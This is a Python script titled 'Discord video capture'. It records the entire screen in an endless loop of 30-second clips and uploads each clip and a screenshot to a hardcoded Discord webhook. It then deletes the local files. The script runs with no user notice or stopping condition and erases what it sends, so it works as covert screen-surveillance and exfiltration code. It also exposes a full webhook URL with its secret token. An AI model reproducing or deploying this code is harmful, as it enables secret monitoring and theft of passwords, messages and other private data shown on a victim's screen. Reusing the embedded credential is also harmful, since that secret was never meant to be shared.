"""
Discord video capture.

:author: Max Milazzo
"""


import os
import cv2
import time
import discord
import pyautogui
import multiprocessing
import numpy as np
from datetime import datetime


RECORD_SECONDS = 30
# number of seconds to record for each clip


WEBHOOK =  discord.SyncWebhook.from_url(
    "https://discord.com/api/webhooks/1200680569562996786/oUWbIw8C1khtr11MdncpwPNLF4kplh4vm0oAHZSKT1SwKj2aGG7VgUsanjG5U90jfXUU"
)
# discord webhook to send capture feed


RESOLUTION = tuple(pyautogui.size())
# device resolution


CODEC = cv2.VideoWriter_fourcc(*"XVID")
# video codec
 

FPS = 10
# video frames per second


DATETIME_FORMAT = "%Y-%m-%d %H%M_%S"
# datetime string format


def send_data(timestamp: str, preview) -> None:
    """
    Transmit data.
    
    :param timestamp: unique timestamp string
    :param preview: image file
    :type preview: pyautogui image capture
    """
    
    preview.save(timestamp + ".png")
    # save final recording screenshot
    
    with open(timestamp + ".avi", "rb") as f:
        WEBHOOK.send(file=discord.File(fp=f))
        # load capture file
        
    with open(timestamp + ".png", "rb") as f:
        WEBHOOK.send(file=discord.File(fp=f))
        # load preview file
    
    os.remove(timestamp + ".avi")
    os.remove(timestamp + ".png")
    # remove transmitted files
    

def capture() -> None:
    """
    Capture a single video clip.
    """

    timestamp = datetime.utcnow().strftime(DATETIME_FORMAT)
    # generate unique timestamp string
    
    out = cv2.VideoWriter(timestamp + ".avi", CODEC, FPS, RESOLUTION)
    # create VideoWriter object
    
    for _ in range(int(RECORD_SECONDS * FPS)):
    # capture feed for specified number of seconds
 
        img = pyautogui.screenshot()
        # take screenshot
     
        frame = np.array(img)
        # convert the screenshot to a numpy array
     
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        # convert from BGR(Blue, Green, Red) to RGB(Red, Green, Blue)
     
        out.write(frame)
        # write it to the output file
    
    multiprocessing.Process(target=send_data, args=(timestamp, img)).start()
    # start data send process


def main() -> None:
    """
    Program entry point.
    """

    while True:
        capture()


if __name__ == "__main__":
    main()